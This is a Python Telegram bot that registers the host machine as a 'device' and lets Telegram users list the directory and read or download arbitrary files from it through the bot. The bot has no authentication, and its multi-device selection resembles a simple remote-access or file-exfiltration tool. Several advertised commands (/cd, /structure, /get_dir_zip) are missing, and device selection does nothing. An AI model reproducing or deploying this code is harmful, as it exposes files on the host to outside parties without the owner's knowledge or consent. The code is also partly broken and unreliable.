import os
import socket
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

BOT_TOKEN = 'your api key'
# Store online devices and selected device
devices = {}
selected_device = None

def start(update: Update, context: CallbackContext):
    # Gather device information
    try:
        username = os.getlogin()
    except OSError:
        username = "Unknown User"
    
    # Detect OS and system name details
    os_name = os.name
    system_name = socket.gethostname()
    os_details = os.uname().sysname if hasattr(os, 'uname') else 'Unknown OS'

    # Construct device ID and register if new
    device_id = f"{username}@{system_name} ({os_details})"
    if device_id not in devices:
        devices[device_id] = {"name": username, "os": os_details, "hostname": system_name}

    # Display commands and welcome message
    welcome_message = (
        f"Welcome, {username}! Here are available commands:\n\n"
        "/start - Display this message\n"
        "/list - List available devices\n"
        "/select <number> - Select device by number\n"
        "/unselect - Unselect current device\n"
        "/ls - List files in the current directory\n"
        "/cat <filename> - View file content\n"
        "/get <filename> - Download a file\n"
        "/get_dir_zip <directory> - Download a directory as ZIP\n"
        "/structure - Display directory structure\n"
        "/cdx - Go up one directory\n"
        "/cd <directory> - Go into the specified directory"
    )
    context.bot.send_message(chat_id=update.effective_chat.id, text=welcome_message)

def list_devices(update: Update, context: CallbackContext):
    if devices:
        device_list = "\n".join([
            f"{i + 1}. {info['name']} - {info['os']} (Hostname: {info['hostname']})"
            for i, info in enumerate(devices.values())
        ])
        update.message.reply_text(f"Available devices:\n{device_list}")
    else:
        update.message.reply_text("No devices available.")

def select_device(update: Update, context: CallbackContext):
    global selected_device
    try:
        device_index = int(context.args[0]) - 1
        selected_device = list(devices.keys())[device_index]
        update.message.reply_text(f"Selected device: {selected_device}")
    except (IndexError, ValueError):
        update.message.reply_text("Invalid selection.")

def unselect_device(update: Update, context: CallbackContext):
    global selected_device
    selected_device = None
    update.message.reply_text("Device unselected.")

def list_files(update: Update, context: CallbackContext):
    if selected_device:
        files = os.listdir()
        context.bot.send_message(chat_id=update.effective_chat.id, text="\n".join(files))
    else:
        update.message.reply_text("No device selected.")

def read_file(update: Update, context: CallbackContext):
    if selected_device:
        file_name = ' '.join(context.args)
        try:
            with open(file_name, 'r') as file:
                content = file.read()
                context.bot.send_message(chat_id=update.effective_chat.id, text=content)
        except FileNotFoundError:
            context.bot.send_message(chat_id=update.effective_chat.id, text="File not found.")
    else:
        update.message.reply_text("No device selected.")

def get_file(update: Update, context: CallbackContext):
    if selected_device:
        file_name = ' '.join(context.args)
        try:
            with open(file_name, 'rb') as file:
                context.bot.send_document(chat_id=update.effective_chat.id, document=file)
        except FileNotFoundError:
            context.bot.send_message(chat_id=update.effective_chat.id, text="File not found.")
    else:
        update.message.reply_text("No device selected.")

def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Register handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("list", list_devices))
    dp.add_handler(CommandHandler("select", select_device, pass_args=True))
    dp.add_handler(CommandHandler("unselect", unselect_device))
    dp.add_handler(CommandHandler("ls", list_files))
    dp.add_handler(CommandHandler("cat", read_file, pass_args=True))
    dp.add_handler(CommandHandler("get", get_file, pass_args=True))
    # Add other file operations as necessary

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
